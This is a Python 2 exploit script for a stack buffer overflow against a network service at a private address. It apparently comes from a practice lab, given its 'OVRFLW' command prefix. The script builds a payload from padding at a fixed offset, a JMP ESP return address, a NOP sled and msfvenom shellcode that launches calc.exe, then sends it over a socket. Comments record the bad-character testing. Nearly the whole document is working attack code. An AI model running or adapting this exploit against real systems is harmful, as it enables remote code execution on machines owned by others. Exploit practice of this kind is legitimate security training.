#!/usr/bin/env python2
import socket
import struct

RHOST = "192.168.1.59"
RPORT = 4455

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

tolen_buf = 3000
offset_rsp = 1494
ptr_jmp_esp = 0x56526683


#badchar_test = "" 			#start with empty string
#badchars = [0x00, 0x0A]			#every time bad...
#badchars += [0x04, 0x38, 0x72, xD9]

#shellcode msfvenom -p windows/exec -b '\x00\x04\x38\x72\x0A\xD9' -f python --var-name buf CMD=calc.exe EXITFUNC=thread

buf =  ""
buf += "\x29\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\xab\xb4\x6d\xb7\x83\xee\xfc\xe2\xf4\x57\x5c"
buf += "\xef\xb7\xab\xb4\x0d\x3e\x4e\x85\xad\xd3\x20\xe4\x5d"
buf += "\x3c\xf9\xb8\xe6\xe5\xbf\x3f\x1f\x9f\xa4\x03\x27\x91"
buf += "\x9a\x4b\xc1\x8b\xca\xc8\x6f\x9b\x8b\x75\xa2\xba\xaa"
buf += "\x73\x8f\x45\xf9\xe3\xe6\xe5\xbb\x3f\x27\x8b\x20\xf8"
buf += "\x7c\xcf\x48\xfc\x6c\x66\xfa\x3f\x34\x97\xaa\x67\xe6"
buf += "\xfe\xb3\x57\x57\xfe\x20\x80\xe6\xb6\x7d\x85\x92\x1b"
buf += "\x6a\x7b\x60\xb6\x6c\x8c\x8d\xc2\x5d\xb7\x10\x4f\x90"
buf += "\xc9\x49\xc2\x4f\xec\xe6\xef\x8f\xb5\xbe\xd1\x20\xb8"
buf += "\x26\x3c\xf3\xa8\x6c\x64\x20\xb0\xe6\xb6\x7b\x3d\x29"
buf += "\x93\x8f\xef\x36\xd6\xf2\xee\x3c\x48\x4b\xeb\x32\xed"
buf += "\x20\xa6\x86\x3a\xf6\xde\x6c\x3a\x2e\x06\x6d\xb7\xab"
buf += "\xe4\x05\x86\x20\xdb\xea\x48\x7e\x0f\x8d\xaa\x81\xbe"
buf += "\x05\x11\x3e\x09\xf0\x48\x7e\x88\x6b\xcb\xa1\x34\x96"
buf += "\x57\xde\xb1\xd6\xf0\xb8\xc6\x02\xdd\xab\xe7\x92\x62"
buf += "\xc8\xd5\x01\xd4\x85\xd1\x15\xd2\xab\xb4\x6d\xb7"

payload = "OVRFLW"
payload += "A" * offset_rsp 
payload += struct.pack("<I", ptr_jmp_esp) 
payload += '\x90'*16
payload += buf
payload += "D" * (tolen_buf - len(payload)) 
payload += "\r\n"

s.send(payload)
s.recv(1024)
s.close()